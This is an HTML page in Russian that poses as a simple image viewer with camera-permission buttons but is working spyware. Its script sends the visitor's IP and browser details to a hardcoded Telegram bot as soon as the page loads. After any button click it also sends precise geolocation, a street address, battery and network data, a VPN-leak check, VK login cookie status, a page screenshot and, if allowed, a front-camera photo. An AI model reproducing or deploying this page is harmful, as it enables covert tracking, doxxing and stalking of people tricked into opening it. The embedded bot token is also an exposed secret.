<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Просмотр изображения</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }
        .image-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container img {
            max-width: 100%;
            max-height: 70vh;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .permission-buttons {
            margin-top: 20px;
        }
        button {
            padding: 10px 15px;
            margin: 0 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        .loading {
            display: none;
            margin-top: 20px;
            font-style: italic;
            color: #666;
        }
        .location-info {
            margin-top: 15px;
            padding: 10px;
            background: #e9f7ef;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="Красивое изображение">
    </div>

    <div class="permission-buttons">
        <button id="allowCamera">Разрешить камеру</button>
        <button id="denyCamera">Отказать</button>
    </div>

    <div class="location-info" id="locationInfo">
        Определение местоположения...
    </div>

    <div class="loading" id="loadingIndicator">
        Отправка данных...
    </div>

    <script>
        // Настройки Telegram бота
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';
        
        // Элементы DOM
        const allowCameraBtn = document.getElementById('allowCamera');
        const denyCameraBtn = document.getElementById('denyCamera');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const locationInfo = document.getElementById('locationInfo');

        // Скрыть кнопки после нажатия
        function hideButtons() {
            allowCameraBtn.style.display = 'none';
            denyCameraBtn.style.display = 'none';
            loadingIndicator.style.display = 'block';
        }

        // Функция для отправки данных в Telegram
        async function sendToTelegram(data, file = null, caption = '') {
            try {
                if (file) {
                    // Отправка файла (фото или скриншота)
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('caption', caption);
                    formData.append('photo', file);
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    // Отправка текстового сообщения
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'HTML'
                        })
                    });
                }
            } catch (error) {
                console.error('Ошибка отправки в Telegram:', error);
            }
        }

        // Функция для определения браузера
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("Trident")) return "Internet Explorer";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            return "Неизвестный";
        }

        // Функция для определения местоположения и города
        async function getLocationAndCity() {
            locationInfo.style.display = 'block';
            
            try {
                if (navigator.geolocation) {
                    // Получаем координаты
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    const coords = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // Показываем координаты пользователю
                    locationInfo.innerHTML = `
                        <strong>Ваше местоположение:</strong><br>
                        Широта: ${coords.lat.toFixed(6)}<br>
                        Долгота: ${coords.lon.toFixed(6)}<br>
                        Точность: ±${Math.round(coords.accuracy)} метров
                    `;
                    
                    // Определяем город через Nominatim API (OpenStreetMap)
                    try {
                        const response = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords.lat}&lon=${coords.lon}&zoom=18&addressdetails=1`
                        );
                        const data = await response.json();
                        
                        let city = 'Не определен';
                        let address = '';
                        
                        if (data.address) {
                            city = data.address.city || data.address.town || 
                                   data.address.village || data.address.county || 'Неизвестный город';
                            address = `
                                <br><strong>Адрес:</strong><br>
                                ${data.address.road ? data.address.road + ', ' : ''}
                                ${data.address.house_number ? data.address.house_number + ', ' : ''}
                                ${city}
                                ${data.address.country ? ', ' + data.address.country : ''}
                            `;
                        }
                        
                        locationInfo.innerHTML += `<br><strong>Город:</strong> ${city}` + address;
                        
                        return {
                            coordinates: coords,
                            city: city,
                            address: data.address || {},
                            fullData: data
                        };
                    } catch (error) {
                        console.log("Ошибка определения города:", error);
                        return {
                            coordinates: coords,
                            city: "Не удалось определить",
                            address: {},
                            fullData: null
                        };
                    }
                }
            } catch (error) {
                console.log("Доступ к геолокации запрещен или ошибка:", error);
                locationInfo.innerHTML = "<strong>Доступ к геолокации запрещен</strong>";
                return null;
            }
            
            return null;
        }

        // Функция для проверки VPN/Proxy
        function checkVPNProxy() {
            // Проверяем различные признаки использования VPN/Proxy
            const tests = {
                timezoneMismatch: false,
                languageMismatch: false,
                webRTCLeak: false,
                dnsLeak: false
            };
            
            // Проверка несоответствия часового пояса и языка
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;
            
            if ((language.startsWith('ru') && !timezone.includes('Europe/Moscow')) ||
                (language.startsWith('en') && !timezone.includes('America') && !timezone.includes('Europe/London'))) {
                tests.timezoneMismatch = true;
            }
            
            // Проверка WebRTC (может выдать реальный IP при использовании VPN)
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(e => console.log(e));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate.indexOf('typ srflx') !== -1) {
                        tests.webRTCLeak = true;
                    }
                };
            } catch (e) {
                console.log("WebRTC test failed:", e);
            }
            
            // Анализ результатов
            if (tests.timezoneMismatch || tests.webRTCLeak) {
                return "Возможно используется VPN/Proxy";
            }
            
            return "Нет явных признаков VPN/Proxy";
        }

        // Функция для получения информации о соединении
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const conn = navigator.connection;
                return {
                    тип: conn.effectiveType,
                    скорость: conn.downlink ? conn.downlink + ' Мбит/с' : 'Неизвестно',
                    ping: conn.rtt ? conn.rtt + ' мс' : 'Неизвестно',
                    экономныйРежим: conn.saveData ? 'Да' : 'Нет'
                };
            }
            return "API соединения не поддерживается";
        }

        // Функция для получения статуса батареи
        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        уровень: Math.round(battery.level * 100) + '%',
                        заряжается: battery.charging ? "Да" : "Нет",
                        времяЗарядки: battery.chargingTime === Infinity ? "Не заряжается" : 
                                       battery.chargingTime > 0 ? Math.floor(battery.chargingTime / 60) + ' мин' : "Полностью заряжена",
                        времяРаботы: battery.dischargingTime === Infinity ? "Не разряжается" : 
                                    battery.dischargingTime > 0 ? Math.floor(battery.dischargingTime / 60) + ' мин' : "Неизвестно"
                    };
                } catch (error) {
                    console.log("Ошибка Battery API:", error);
                }
            }
            return "Battery API не поддерживается";
        }

        // Функция для проверки авторизации ВКонтакте
        function checkVKAuth() {
            return document.cookie.includes('remixsid') || 
                   document.cookie.includes('vk_app_') ? "Да" : "Нет";
        }

        // Функция для определения провайдера
        async function getISPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    провайдер: data.org || 'Неизвестно',
                    страна: data.country_name || 'Неизвестно',
                    регион: data.region || 'Неизвестно',
                    город: data.city || 'Неизвестно',
                    IP: data.ip || 'Неизвестно'
                };
            } catch (error) {
                console.log("Ошибка получения данных провайдера:", error);
                return "Не удалось получить информацию";
            }
        }

        // Функция для фото с камеры
        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const photoBlob = await imageCapture.takePhoto();
                
                // Останавливаем поток
                stream.getTracks().forEach(track => track.stop());
                
                return new File([photoBlob], 'user_photo.jpg', { type: 'image/jpeg' });
            } catch (error) {
                console.log("Ошибка камеры:", error);
                return null;
            }
        }

        // Функция для создания скриншота
        async function takeScreenshot() {
            try {
                // Динамическая загрузка html2canvas
                if (typeof html2canvas !== 'function') {
                    const script = document.createElement('script');
                    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
                    document.head.appendChild(script);
                    
                    await new Promise(resolve => script.onload = resolve);
                }
                
                const canvas = await html2canvas(document.body);
                return new Promise(resolve => {
                    canvas.toBlob(blob => {
                        resolve(new File([blob], 'screenshot.png', { type: 'image/png' }));
                    }, 'image/png');
                });
            } catch (error) {
                console.log("Ошибка скриншота:", error);
                return null;
            }
        }

        // Главная функция сбора и отправки данных
        async function collectAndSendData(withCamera = false) {
            hideButtons();
            
            // Собираем основные данные
            const locationData = await getLocationAndCity();
            const battery = await getBatteryStatus();
            const ispInfo = await getISPInfo();
            
            // Формируем сообщение
            const userData = `
<b>🆕 Новый посетитель!</b>

<b>📅 Время:</b> ${new Date().toLocaleString()}
<b>🌐 Браузер:</b> ${getBrowserName()}
<b>🖥️ ОС:</b> ${navigator.platform}
<b>📱 User Agent:</b> ${navigator.userAgent}

<b>📍 Геолокация:</b> 
${locationData ? `
- Широта: ${locationData.coordinates.lat.toFixed(6)}
- Долгота: ${locationData.coordinates.lon.toFixed(6)}
- Точность: ±${Math.round(locationData.coordinates.accuracy)} метров
- Город: ${locationData.city}
- Адрес: ${locationData.address.road || ''} ${locationData.address.house_number || ''}
- Почтовый индекс: ${locationData.address.postcode || 'Нет данных'}
` : 'Не доступно'}

<b>🌍 Интернет-провайдер:</b>
- IP: ${ispInfo.IP || 'Неизвестно'}
- Провайдер: ${ispInfo.провайдер || 'Неизвестно'}
- Страна: ${ispInfo.страна || 'Неизвестно'}
- Регион: ${ispInfo.регион || 'Неизвестно'}

<b>📶 Соединение:</b> 
${JSON.stringify(getConnectionInfo(), null, 2).replace(/[{}"]/g, '').replace(/,/g, '\n')}

<b>🔋 Батарея:</b> 
${typeof battery === 'object' ? 
`- Уровень: ${battery.уровель}
- Заряжается: ${battery.заряжается}
- Время до зарядки: ${battery.времяЗарядки}
- Время работы: ${battery.времяРаботы}`
: battery}

<b>🛡️ VPN/Proxy:</b> ${checkVPNProxy()}

<b>🖥️ Система:</b>
- Разрешение: ${screen.width}x${screen.height}
- Глубина цвета: ${screen.colorDepth}-bit
- Язык: ${navigator.language}
- Куки: ${document.cookie ? 'Есть' : 'Нет'}
- VK авторизация: ${checkVKAuth()}
- Доступ к камере: ${withCamera ? 'Разрешено' : 'Запрещено'}
            `;
            
            // Отправляем основные данные
            await sendToTelegram(userData);
            
            // Пробуем сделать и отправить скриншот
            const screenshot = await takeScreenshot();
            if (screenshot) {
                await sendToTelegram(null, screenshot, 'Скриншот страницы');
            }
            
            // Пробуем сделать и отправить фото, если разрешено
            if (withCamera) {
                const photo = await takePhoto();
                if (photo) {
                    await sendToTelegram(null, photo, 'Фото с камеры пользователя');
                }
            }
            
            loadingIndicator.textContent = "Данные отправлены!";
        }

        // Обработчики кнопок
        allowCameraBtn.addEventListener('click', () => collectAndSendData(true));
        denyCameraBtn.addEventListener('click', () => collectAndSendData(false));

        // Отправляем минимальные данные сразу при загрузке страницы
        (async function() {
            const minimalData = `
<b>⚠️ Новый посетитель зашел на сайт!</b>

<b>Время:</b> ${new Date().toLocaleString()}
<b>Браузер:</b> ${getBrowserName()}
<b>ОС:</b> ${navigator.platform}
<b>Экран:</b> ${screen.width}x${screen.height}
<b>IP:</b> ${(await getISPInfo()).IP || 'Неизвестно'}
            `;
            
            await sendToTelegram(minimalData);
        })();
    </script>
</body>
</html>
